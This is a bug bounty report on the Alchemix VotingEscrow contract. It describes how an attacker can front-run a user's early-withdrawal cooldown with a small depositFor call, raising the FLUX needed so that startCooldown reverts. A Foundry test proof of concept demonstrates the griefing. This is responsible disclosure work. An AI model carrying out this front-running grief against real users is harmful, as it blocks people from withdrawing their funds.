# 31080 - \[SC - Insight] DoS in startCooldown when users want start cool...

Submitted on May 12th 2024 at 11:24:32 UTC by @Lastc0de for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31080

Report type: Smart Contract

Report severity: Insight

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Permanent freezing of unclaimed yield
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
* Temporary freezing of funds for 12 hours

## Description

## Brief/Intro

There will be a one-epoch `cooldown` period between unlocked tokens and being able to claim them to the user’s wallet. Locked tokens can become eligible for unlocks by burning Flux tokens. When the user wants to withdraw his/here locked tokens, he/she must start the `cooldDown` mechanism before withdrawing, otherwise he will not be able to withdraw.

Activating this process is possible in two ways:

* 1- lock period is expired
* 2- lock period is not expired

There is a vulnerability in model 2 that allows a malicious user to freeze the activation of this process for a short or long time for users who want to use the second method ( Denial-of-Service).

## Vulnerability Details

* Vulnerable contract is `VotingEscrow.sol`:

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

* Vulnerable function is `startCooldown()` : <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L778C1-L804C6>

```
    function startCooldown(uint256 _tokenId) external {
//...

        locked[_tokenId].cooldown = block.timestamp + WEEK;

        // If lock is not expired, cooldown can only be started by burning FLUX
        if (block.timestamp < _locked.end) {
            // Amount of FLUX required to ragequit
            uint256 fluxToRagequit = amountToRagequit(_tokenId); // @AUDIT-1

            require(IFluxToken(FLUX).balanceOf(msg.sender) >= fluxToRagequit, "insufficient FLUX balance"); // @AUDIT-2

            IFluxToken(FLUX).burnFrom(msg.sender, fluxToRagequit);

            emit Ragequit(msg.sender, _tokenId, block.timestamp);
        }

        emit CooldownStarted(msg.sender, _tokenId, _locked.cooldown);
    }
```

When a user want withdraw his/here locked amounts before do that should start coold down process. Above we can see the function that activates this process. When a user who wish to unlock their veALCX early, should burn Flux Tokens this means that should buy Flux Token of other users

## Deep dive

* AUDIT-1 For this, the `VotingEscrow.sol` first calculates Amount of FLUX required to `ragequit` by calling the `amountToRagequit()` function: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L345C1-L356C6>

```
    /// @inheritdoc IVotingEscrow
    function amountToRagequit(uint256 _tokenId) public view returns (uint256) {
        // amount of flux earned in one epoch
        uint256 oneEpochFlux = claimableFlux(_tokenId); // @AUDIT-1-A

//..
    }

```

* AUDIT-1-A In the first line of this function, the amount of flux earned in one epoch is obtained by calling the `claimableFlux` function: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L377C1-L385C6>

```
    function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }

        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS; // @AUDIT-1-A-a
    }
```

* AUDIT-1-A-a This line calculate and return Amount of flux claimable is percent of the balance
* as you can see this function calculate returned value by percent of the balance so by deposit for a `tokenId` can manipulate this value.

We can do this by calling the `depositFor()` function: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L667C1-L678C1>

```
    function depositFor(uint256 _tokenId, uint256 _value) external nonreentrant {
//...
    }

```

## but what is the problem?

So we go to the beginning of the report to see `AUDIT-2`:

* AUDIT-2 : `require(IFluxToken(FLUX).balanceOf(msg.sender) >= fluxToRagequit, "insufficient FLUX balance");`

If the balance of the Flux Token for user is less than the calculated value meaning `fluxToRagequit`, the user cannot call this function for a while, so the user must increase the balance of Flux tokens in his wallet, and this is only possible by buying tokens from other users.

## Secnario

For example, Bob wants to withdraw his tokens before the lock time done.

1- Bob knows for do this should buy 5 Flux Token

2- Bob buyed 5 Flux Token

3- Alex knows Bob Want withdraw his locked tokens (Ex:front-running)

4- Alex before Bob make call depositFor() - for Bob tokenId with small amount

5- Bob cant start coold down because he does not have enough tokens for this

6- Bob should buy more Flux Token

7- A malicious user can do this for a long time and prevent the withdrawal of other users' tokens

## Impact Details

Attacker can Freeze this function for users so users for short -or long time cant withdraw his/here locked tokens

## References

<https://alchemixfi.medium.com/vealcx-update-272e8900ac5a>

## Proof of Concept

1- Add this function in `VotingEscrow.t.sol` file :

```
    function test_AmountToRagequit_Fuzzing() public {
        uint256 tokenId = createVeAlcx(admin, TOKEN_1, THREE_WEEKS, false);

        uint256 ragequitAmount = veALCX.amountToRagequit(tokenId);

        // Log regequitAmount
        console.log("#BEFORE - How much `ragequitAmount` need ? %d", ragequitAmount);

        // Mint needed Ragequit and withdraw token
        hevm.prank(address(veALCX));
        flux.mint(admin, ragequitAmount);

        // Approve Flux token
        hevm.prank(admin);
        flux.approve(address(veALCX), ragequitAmount);


        /* Maliciouse User call `depositFor()` function for tokenId with small amount
            1- Mint bpt token for this Maliciouse contract
            2- call depositFor() , for tokenId
        */
        deal(bpt, address(this), TOKEN_1);
        IERC20(bpt).approve(address(veALCX), TOKEN_1);
        veALCX.depositFor(tokenId, 1e7); // Deposit small amount for user - `tokenId`

        // Log regequitAmount
        uint256 ragequitAmount_AFTER = veALCX.amountToRagequit(tokenId);
        console.log("#AFTER - How much `ragequitAmount` need ? %d", ragequitAmount_AFTER);

        // check `ragequitAmount` and `ragequitAmount_AFTER` is equal or not
        assertEq(ragequitAmount,ragequitAmount_AFTER,"`ragequitAmount` before and after not equal because:");

        hevm.expectRevert("startCooldown() TX reverted because : `ragequitAmount` increased by Maliciouse user");
        hevm.prank(admin);
        veALCX.startCooldown(tokenId);
    }
```

2- Runing test

```
forge test --match-test "test_AmountToRagequit_Fuzzing" --fork-url https://eth-mainnet.public.blastapi.io -vvvv
```
